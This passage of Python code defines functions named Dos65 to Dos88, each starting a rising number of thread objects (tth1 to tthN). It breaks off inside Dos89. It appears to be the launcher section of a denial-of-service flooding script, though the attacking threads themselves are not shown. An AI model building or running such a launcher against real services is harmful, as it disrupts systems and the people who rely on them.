    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
def Dos65():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
def Dos66():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
def Dos67():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
def Dos68():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
def Dos69():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
def Dos70():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
def Dos71():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
def Dos72():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
def Dos73():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
def Dos74():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
def Dos75():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
def Dos76():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
def Dos77():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
def Dos78():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
def Dos79():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
def Dos80():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
def Dos81():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
def Dos82():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
def Dos83():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
    tth83.start()
def Dos84():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
    tth83.start()
    tth84.start()
def Dos85():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
    tth83.start()
    tth84.start()
    tth85.start()
def Dos86():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
    tth83.start()
    tth84.start()
    tth85.start()
    tth86.start()
def Dos87():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
    tth83.start()
    tth84.start()
    tth85.start()
    tth86.start()
    tth87.start()
def Dos88():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
    tth22.start()
    tth23.start()
    tth24.start()
    tth25.start()
    tth26.start()
    tth27.start()
    tth28.start()
    tth29.start()
    tth30.start()
    tth31.start()
    tth32.start()
    tth33.start()
    tth34.start()
    tth35.start()
    tth36.start()
    tth37.start()
    tth38.start()
    tth39.start()
    tth40.start()
    tth41.start()
    tth42.start()
    tth43.start()
    tth44.start()
    tth45.start()
    tth46.start()
    tth47.start()
    tth48.start()
    tth49.start()
    tth50.start()
    tth51.start()
    tth52.start()
    tth53.start()
    tth54.start()
    tth55.start()
    tth56.start()
    tth57.start()
    tth58.start()
    tth59.start()
    tth60.start()
    tth61.start()
    tth62.start()
    tth63.start()
    tth64.start()
    tth65.start()
    tth66.start()
    tth67.start()
    tth68.start()
    tth69.start()
    tth70.start()
    tth71.start()
    tth72.start()
    tth73.start()
    tth74.start()
    tth75.start()
    tth76.start()
    tth77.start()
    tth78.start()
    tth79.start()
    tth80.start()
    tth81.start()
    tth82.start()
    tth83.start()
    tth84.start()
    tth85.start()
    tth86.start()
    tth87.start()
    tth88.start()
def Dos89():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
